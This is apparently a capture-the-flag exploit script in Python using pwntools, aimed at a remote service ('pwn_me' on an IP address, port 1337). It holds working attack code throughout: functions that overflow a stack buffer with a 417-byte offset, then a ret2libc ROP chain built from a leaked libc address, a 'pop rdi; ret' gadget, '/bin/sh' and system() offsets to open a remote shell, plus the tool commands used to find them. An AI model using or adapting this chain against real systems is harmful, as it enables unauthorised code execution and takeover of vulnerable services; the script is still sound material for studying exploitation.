import struct
from pwn import *

#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.27.so")}
#p = process("./pwn_me", env=env)
#p = process("./pwn_me")
p = remote("64.227.23.177",1337)

def A_smash():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = "almond "
    payload += "A"*1000
    p.sendline(payload)
    print(p.recv())

def cycle_rip():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = b"almond "
    payload += cyclic(1000)
    p.sendline(payload)
    print(p.recv())
    print("Input RIP from GDB")
    print(cyclic_find(input()))
    #417

def check_cycle():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = "almond "
    payload += "A"*417
    payload += "B"*8
    p.sendline(payload)
    print(p.recv())

def pop_shell_system():
    recd = p.recv()
    input()
    print(recd)
    addr_str = recd.split(b'\n')[0]
    print("Given libc addr ", addr_str)
    given_addr = int(addr_str, 16)
    base_addr = given_addr - 4111520 
    payload = b'almond '
    payload += b'A'*417
    #strings -a -t x libc-2.27.so | grep bin
    bin_sh_offset = 0x1b3e9a 
    #objdump -d libc-2.27.so | grep "system"
    system_function_offset = 0x4f440
    #ROPgadget --binary libc-2.27.so > rops.txt
    #grep "pop rdi ; ret" rops.txt
    pop_rdi_ret_offset = 0x000000000002155f
    filler_rop = 0x00000000000b17c5 # for stack alignment
    payload += struct.pack('Q', base_addr + filler_rop)
    payload += struct.pack('Q', base_addr + pop_rdi_ret_offset)
    payload += struct.pack('Q', base_addr + bin_sh_offset)
    payload += struct.pack('Q', base_addr + system_function_offset)
    p.sendline(payload)
    p.interactive()

if __name__=='__main__':
    #A_smash()
    #cycle_rip()
    #check_cycle()
    pop_shell_system()
